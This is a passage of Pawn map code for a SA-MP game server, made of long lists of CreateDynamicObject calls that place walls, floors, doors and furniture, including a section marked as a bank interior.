	CreateDynamicObject(19379, 1581.46497, -1685.17004, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1581.46497, -1665.91003, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1549.96802, -1704.43005, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1581.46497, -1694.80298, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1581.46497, -1656.27698, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1591.96497, -1684.53003, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1591.96497, -1665.91003, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1591.96497, -1656.27698, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19380, 1584.50000, -1678.47498, 1089.50000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19380, 1584.50000, -1668.84119, 1089.50000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19380, 1584.50000, -1688.09998, 1089.50000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1578.80005, -1684.52002, 1107.01001,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1578.80005, -1694.15002, 1107.01001,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1589.30005, -1684.52002, 1107.01001,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1578.80005, -1703.78503, 1107.01001,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1589.30005, -1694.15002, 1107.01001,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1589.30005, -1703.78503, 1107.01001,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1599.80005, -1688.57996, 1107.01001,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1599.80005, -1698.20996, 1107.01001,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1599.80005, -1707.83997, 1107.01001,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19387, 1555.94995, -1691.59204, 1101.83008,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 1560.88501, -1683.48096, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 1560.88501, -1667.61804, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 1564.09497, -1664.25000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 1564.09497, -1686.87000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 1555.97998, -1691.58997, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 1575.42102, -1675.54968, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 1555.97998, -1694.80005, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 1575.42102, -1681.96497, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 1575.42102, -1669.13501, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 1573.72498, -1664.25000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 1573.72498, -1686.87000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 1579.09521, -1681.96497, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 1579.09521, -1669.13501, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 1580.88501, -1683.67505, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 1591.50000, -1687.82495, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 1593.19397, -1688.57996, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 1593.19397, -1698.20996, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 1593.19397, -1704.63000, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19393, 1586.28503, -1665.38306, 1091.32996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19404, 1577.67297, -1683.67505, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19404, 1584.09497, -1683.67505, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19404, 1586.77295, -1682.91895, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19404, 1586.77905, -1682.91797, 1101.82898,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19404, 1586.77698, -1682.91895, 1104.00000,   180.00000, 0.00000, 0.00000);
	CreateDynamicObject(19404, 1589.00000, -1694.81995, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19404, 1589.00000, -1698.03003, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19410, 1587.97998, -1666.90002, 1091.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19430, 1555.95105, -1693.21997, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19431, 1576.95996, -1689.40100, 1101.74500,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19431, 1585.90002, -1680.44800, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19431, 1586.77295, -1680.51001, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19431, 1586.77197, -1667.63074, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19431, 1587.50000, -1684.50000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19431, 1586.77295, -1699.92004, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19431, 1593.91003, -1708.51196, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19431, 1594.47998, -1712.55005, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19439, 1572.97998, -1660.15002, 1100.17004,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19439, 1572.98096, -1659.97998, 1100.28003,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19439, 1572.97998, -1659.80005, 1100.37000,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19439, 1572.99902, -1659.62500, 1100.46997,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19439, 1574.58606, -1661.45996, 1098.80896,   180.00000, 0.00000, 90.00000);
	CreateDynamicObject(19439, 1574.60498, -1659.62500, 1100.46997,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19439, 1575.30005, -1659.62500, 1099.57996,   90.00000, 90.00000, 90.00000);
	CreateDynamicObject(19439, 1572.99902, -1656.12500, 1100.46997,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19439, 1572.97998, -1655.94995, 1100.37000,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19439, 1572.98096, -1655.75000, 1100.27002,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19439, 1572.97998, -1655.55005, 1100.17004,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19439, 1574.60498, -1656.12500, 1100.46997,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19439, 1575.30005, -1656.12500, 1099.57996,   90.00000, 90.00000, 90.00000);
	CreateDynamicObject(19439, 1574.58606, -1654.30005, 1098.80896,   180.00000, 0.00000, 90.00000);
	CreateDynamicObject(19447, 1551.15002, -1688.58997, 1100.01001,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19447, 1551.15002, -1692.08997, 1100.01001,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19449, 1555.94995, -1685.18005, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19449, 1554.26904, -1685.52002, 1100.84998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19449, 1552.58997, -1685.52002, 1100.84998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19449, 1550.91003, -1685.52002, 1100.84998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19449, 1551.07996, -1686.90002, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19449, 1546.25000, -1689.03003, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19449, 1551.07996, -1693.92505, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1555.97998, -1675.54968, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1555.97998, -1685.18005, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1555.97998, -1665.92004, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1557.67505, -1664.25000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1557.67505, -1686.87000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1570.51501, -1683.48096, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1570.51501, -1667.61804, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1551.07996, -1693.94104, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1555.97998, -1656.29004, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1573.92603, -1684.52002, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1572.09998, -1659.34497, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1572.09998, -1691.77002, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1578.65503, -1679.62305, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1560.87805, -1699.50000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1577.00000, -1689.40002, 1098.42297,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1562.63000, -1651.56006, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1577.00000, -1689.40002, 1105.13000,   0.00000, 180.00000, 90.00000);
	CreateDynamicObject(19450, 1555.97998, -1701.19995, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1580.14502, -1664.25000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1580.14502, -1686.87000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1544.81995, -1698.80005, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1573.92603, -1694.15002, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1583.82349, -1670.81995, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1570.51001, -1699.50000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1572.25806, -1651.56006, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1588.29004, -1679.62305, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1580.14001, -1699.50000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1573.92603, -1703.78503, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1551.07996, -1709.06201, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1581.89197, -1651.56006, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1591.50000, -1675.48206, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1591.50000, -1675.48206, 1098.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1589.78003, -1664.25000, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1544.81995, -1708.43005, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1591.50000, -1679.62305, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1591.50000, -1675.48206, 1105.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1591.50000, -1671.37695, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1591.50000, -1671.37695, 1098.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1591.50000, -1679.62305, 1105.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1591.50000, -1675.48206, 1094.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1586.77295, -1694.30005, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1591.50000, -1671.37695, 1094.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1589.00000, -1688.40295, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1591.50000, -1675.48206, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1591.50000, -1667.30005, 1098.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1591.50000, -1667.30005, 1094.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1593.00000, -1684.52002, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1591.50098, -1689.40002, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1578.65503, -1708.51196, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1594.50806, -1659.34497, 1101.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1591.52002, -1651.56006, 1101.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1598.94995, -1680.30005, 1105.32996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1598.94995, -1678.90002, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1599.50000, -1670.75403, 1098.32996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1599.50000, -1670.75403, 1094.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1589.00000, -1704.44995, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1598.09497, -1693.38000, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1601.13000, -1683.67505, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1588.29004, -1708.51196, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1598.09497, -1703.01001, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1604.94995, -1688.57996, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1604.94995, -1698.20996, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1594.63196, -1713.03003, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1600.09998, -1712.55005, 1108.82996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 1604.94995, -1707.84497, 1108.82996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 1556.96497, -1704.43005, 1103.59998,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 1595.90002, -1670.69995, 1098.95996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1579.86499, -1678.48206, 1091.32996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1580.75000, -1675.05005, 1091.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1579.86499, -1668.84802, 1091.32996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1580.75000, -1678.72302, 1091.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1581.28003, -1671.37695, 1091.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1580.75000, -1682.40002, 1091.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1580.75000, -1686.07300, 1091.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1579.86499, -1688.09998, 1091.32996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1580.75000, -1689.75195, 1091.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1584.77002, -1664.12000, 1091.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1589.67200, -1676.28198, 1091.32996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1589.67200, -1685.91797, 1091.32996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1589.67200, -1662.39404, 1091.32996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1590.38403, -1689.75195, 1091.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1594.40002, -1671.37695, 1091.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1594.40002, -1667.30005, 1091.32996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19461, 1569.00000, -1675.54968, 1099.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19461, 1569.00000, -1675.54968, 1104.00000,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19462, 1556.96497, -1704.43005, 1100.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1597.31677, -1680.32703, 1106.13000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1597.75000, -1670.75000, 1093.75000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(1491, 1574.45374, -1664.26062, 1100.07202,   0.00000, 0.00000, -181.01987);
	CreateDynamicObject(1491, 1579.07959, -1668.35828, 1100.07202,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1491, 1579.05322, -1681.18896, 1100.07202,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1491, 1574.46472, -1686.85645, 1100.07202,   0.00000, 0.00000, -180.29970);
	CreateDynamicObject(1491, 1593.19568, -1687.79456, 1107.09802,   0.00000, 0.00000, -90.11996);
	CreateDynamicObject(1491, 1593.16248, -1697.43274, 1107.09802,   0.00000, 0.00000, -90.11996);
	CreateDynamicObject(1491, 1593.16248, -1703.85547, 1107.09802,   0.00000, 0.00000, -90.11996);
	CreateDynamicObject(1491, 1580.06482, -1683.65295, 1107.09802,   0.00000, 0.00000, 0.00000);

	// ---------------------------- INTERIOR DO BANCO ----------------------------

	CreateDynamicObject(14602, 1443.33521, -985.86328, 1000.47083,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1420.34436, -987.59058, 996.85638,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1420.34436, -997.22662, 996.85638,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1420.34436, -977.94659, 996.85638,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1420.34436, -968.31262, 996.85638,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19377, 1425.39563, -997.23810, 998.69531,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19379, 1425.52917, -996.80780, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19377, 1425.39563, -987.59912, 998.69928,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19377, 1425.39563, -977.97009, 998.69531,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19377, 1425.39563, -968.33612, 998.69531,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19450, 1425.15210, -1001.58301, 996.85638,   0.00000, 0.00000, 89.99190);
	CreateDynamicObject(19450, 1444.42175, -992.99921, 996.85638,   0.00000, 0.00000, 89.99190);
	CreateDynamicObject(19450, 1425.24097, -1001.64844, 996.85638,   0.00000, 0.00000, 89.99190);
	CreateDynamicObject(19450, 1435.60022, -997.79559, 996.85638,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1430.77246, -1001.59528, 996.85638,   0.00000, 0.00000, 89.99190);
	CreateDynamicObject(1569, 1432.61536, -1001.55011, 995.10773,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 1438.83838, -993.01642, 996.85449,   0.00000, 0.00000, 90.90000);
	CreateDynamicObject(19431, 1436.57031, -993.03369, 996.85193,   0.00000, 0.00000, 89.95040);
	CreateDynamicObject(19431, 1436.32031, -993.03369, 996.85388,   0.00000, 0.00000, 89.95040);
	CreateDynamicObject(19450, 1425.15210, -970.08197, 996.85638,   0.00000, 0.00000, 89.99190);
	CreateDynamicObject(19450, 1427.71814, -970.08197, 996.85638,   0.00000, 0.00000, 89.99190);
	CreateDynamicObject(19450, 1439.00610, -970.08197, 996.85638,   0.00000, 0.00000, 89.99190);
	CreateDynamicObject(19450, 1448.52612, -970.08197, 996.85638,   0.00000, 0.00000, 89.99190);
	CreateDynamicObject(19388, 1433.38245, -970.08441, 996.86249,   0.00000, 0.00000, 89.78290);
	CreateDynamicObject(19450, 1444.40637, -976.56262, 996.85638,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1444.40637, -966.93060, 996.85638,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 1444.40637, -994.98560, 996.85638,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19377, 1435.89355, -997.23810, 998.69531,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19377, 1435.89355, -987.59912, 998.70532,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19377, 1435.89355, -977.97009, 998.70532,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19377, 1435.89355, -968.33612, 998.69531,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19377, 1446.39160, -968.33612, 998.69531,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19377, 1446.39160, -977.97009, 998.69733,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19377, 1446.39160, -987.59912, 998.69733,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19450, 1444.40637, -986.19659, 1000.16260,   -180.00000, 0.00000, 0.00000);
	CreateDynamicObject(1569, 1457.74744, -985.02881, 995.10431,   0.00000, 0.00000, -90.06000);
	CreateDynamicObject(19377, 1446.35864, -997.23810, 998.69531,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(16101, 1424.50464, -988.71008, 990.73462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16101, 1424.50464, -990.89410, 990.73462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16101, 1424.50464, -993.07813, 990.73462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16101, 1424.50464, -995.26208, 990.73462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16101, 1424.50464, -997.44611, 990.73462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16101, 1424.50464, -999.63013, 990.73462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16101, 1424.50464, -983.33411, 990.73462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16101, 1424.50464, -981.15009, 990.73462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16101, 1424.50464, -978.96613, 990.73462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16101, 1424.50464, -976.78210, 990.73462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16101, 1424.50464, -974.59808, 990.73462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16101, 1424.50464, -972.41412, 990.73462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19325, 1424.51428, -991.97479, 999.00391,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19325, 1424.51428, -998.45477, 999.00391,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19325, 1424.51428, -980.05078, 999.00391,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19325, 1424.51428, -973.42279, 999.00391,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2190, 1426.35876, -983.58972, 995.82874,   0.00000, 0.00000, -39.84000);
	CreateDynamicObject(2190, 1427.57007, -986.54395, 995.82874,   0.00000, 0.00000, -102.06001);
	CreateDynamicObject(2190, 1425.72351, -988.86444, 995.82874,   0.00000, 0.00000, -154.73996);
	CreateDynamicObject(1715, 1425.98022, -986.25348, 995.10559,   0.00000, 0.00000, 81.60000);
	CreateDynamicObject(1715, 1425.09607, -984.83795, 995.10559,   0.00000, 0.00000, 148.67998);
	CreateDynamicObject(1715, 1424.76306, -987.25067, 995.10559,   0.00000, 0.00000, 29.09999);
	CreateDynamicObject(2244, 1427.16125, -984.70050, 996.06403,   0.00000, 0.00000, 27.72000);
	CreateDynamicObject(2244, 1426.93335, -987.59070, 996.06403,   0.00000, 0.00000, -24.42000);
	CreateDynamicObject(2165, 1420.89612, -986.00458, 995.10638,   0.00000, 0.00000, 89.57999);
	CreateDynamicObject(1715, 1422.16272, -985.46423, 995.10559,   0.00000, 0.00000, -105.06001);
	CreateDynamicObject(2164, 1420.47449, -980.71246, 995.10602,   0.00000, 0.00000, 87.65998);
	CreateDynamicObject(2773, 1426.07617, -993.09894, 995.65790,   0.00000, 0.00000, 89.16010);
	CreateDynamicObject(2773, 1426.07690, -990.98590, 995.65790,   0.00000, 0.00000, 89.16010);
	CreateDynamicObject(2773, 1426.07617, -995.23187, 995.65790,   0.00000, 0.00000, 89.16010);
	CreateDynamicObject(2773, 1426.07617, -997.52289, 995.65790,   0.00000, 0.00000, 89.16010);
	CreateDynamicObject(2773, 1426.07617, -999.65588, 995.65790,   0.00000, 0.00000, 89.16010);
	CreateDynamicObject(2773, 1426.07690, -981.18988, 995.65790,   0.00000, 0.00000, 89.16010);
	CreateDynamicObject(2773, 1426.07690, -979.05688, 995.65790,   0.00000, 0.00000, 89.16010);
	CreateDynamicObject(2773, 1426.07690, -976.84491, 995.65790,   0.00000, 0.00000, 89.16010);
	CreateDynamicObject(2773, 1426.07690, -974.63287, 995.65790,   0.00000, 0.00000, 89.16010);
	CreateDynamicObject(2773, 1426.07690, -972.42090, 995.65790,   0.00000, 0.00000, 89.16010);
	CreateDynamicObject(1514, 1424.18726, -992.59534, 996.20605,   0.00000, 0.00000, 89.58002);
	CreateDynamicObject(1514, 1424.18726, -994.72827, 996.20612,   0.00000, 0.00000, 89.58000);
	CreateDynamicObject(1514, 1424.18726, -996.94031, 996.20612,   0.00000, 0.00000, 89.58000);
	CreateDynamicObject(1514, 1424.18726, -999.23132, 996.20612,   0.00000, 0.00000, 89.58000);
	CreateDynamicObject(1514, 1424.18726, -980.66632, 996.20612,   0.00000, 0.00000, 89.58000);
	CreateDynamicObject(1514, 1424.18726, -978.53333, 996.20612,   0.00000, 0.00000, 89.58000);
	CreateDynamicObject(1514, 1424.18726, -976.32129, 996.20612,   0.00000, 0.00000, 89.58000);
	CreateDynamicObject(1514, 1424.18726, -974.18829, 996.20612,   0.00000, 0.00000, 89.58000);
	CreateDynamicObject(1514, 1424.18726, -971.97632, 996.20612,   0.00000, 0.00000, 89.58000);
	CreateDynamicObject(1514, 1424.18726, -1001.12732, 996.20612,   0.00000, 0.00000, 89.58000);
	CreateDynamicObject(2599, 1426.01086, -1000.61847, 995.50098,   0.00000, 0.00000, -90.78001);
	CreateDynamicObject(2599, 1425.84473, -973.51959, 995.50061,   0.00000, 0.00000, -89.88000);
	CreateDynamicObject(2007, 1420.94165, -999.54968, 995.10248,   0.00000, 0.00000, 89.76000);
	CreateDynamicObject(2007, 1420.94165, -998.60168, 995.10248,   0.00000, 0.00000, 89.76000);
	CreateDynamicObject(2007, 1420.94165, -997.65369, 995.10248,   0.00000, 0.00000, 89.76000);
	CreateDynamicObject(2007, 1420.94165, -996.70569, 995.10248,   0.00000, 0.00000, 89.76000);
	CreateDynamicObject(2007, 1420.94165, -995.75769, 995.10248,   0.00000, 0.00000, 89.76000);
	CreateDynamicObject(1806, 1422.44788, -971.87213, 995.10742,   0.00000, 0.00000, -78.18002);
	CreateDynamicObject(1806, 1422.44788, -973.37311, 995.10742,   0.00000, 0.00000, -86.22002);
	CreateDynamicObject(1806, 1422.44788, -975.50610, 995.10742,   0.00000, 0.00000, -94.20003);
	CreateDynamicObject(1806, 1422.44788, -977.63910, 995.10742,   0.00000, 0.00000, -93.60002);
	CreateDynamicObject(1806, 1422.44788, -979.93011, 995.10742,   0.00000, 0.00000, -83.64001);
	CreateDynamicObject(1806, 1422.44788, -991.78009, 995.10742,   0.00000, 0.00000, -87.24001);
	CreateDynamicObject(1806, 1422.44788, -993.75513, 995.10742,   0.00000, 0.00000, -101.16003);
	CreateDynamicObject(1806, 1422.44788, -996.04608, 995.10742,   0.00000, 0.00000, -91.26003);
	CreateDynamicObject(1806, 1422.44788, -998.33710, 995.10742,   0.00000, 0.00000, -89.94003);
	CreateDynamicObject(1806, 1422.44788, -1000.23309, 995.10742,   0.00000, 0.00000, -78.18000);
	CreateDynamicObject(19379, 1425.52917, -987.17383, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19379, 1425.52917, -977.54077, 995.01910,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(19379, 1425.52917, -967.90881, 995.01910,   0.00000, -90.00000, 0.00000);
